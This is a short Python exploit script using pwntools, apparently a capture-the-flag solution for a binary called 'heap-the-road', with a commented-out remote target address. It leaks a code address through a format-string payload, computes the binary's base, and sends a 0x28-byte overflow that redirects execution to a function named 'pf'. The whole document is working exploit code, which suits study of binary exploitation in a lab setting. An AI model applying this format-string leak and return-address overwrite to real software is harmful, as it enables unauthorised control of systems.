from pwn import *

BIN = './heap-the-road'
context.binary = BIN

p = process(BIN)
# p = remote('141.85.224.106', 31441)
elf = ELF(BIN)

p.recvline()
payload = b'%11$lx'
p.sendline(payload)
leak = p.recvline().rstrip()
good_func_addr = int(leak.decode(), 16)

text_offset = good_func_addr - elf.symbols['good_func']
pf_addr = text_offset + elf.symbols['pf']

payload = b'a' * 0x28 + pack(pf_addr)
p.sendline(payload)
print(p.recvline().decode().rstrip())
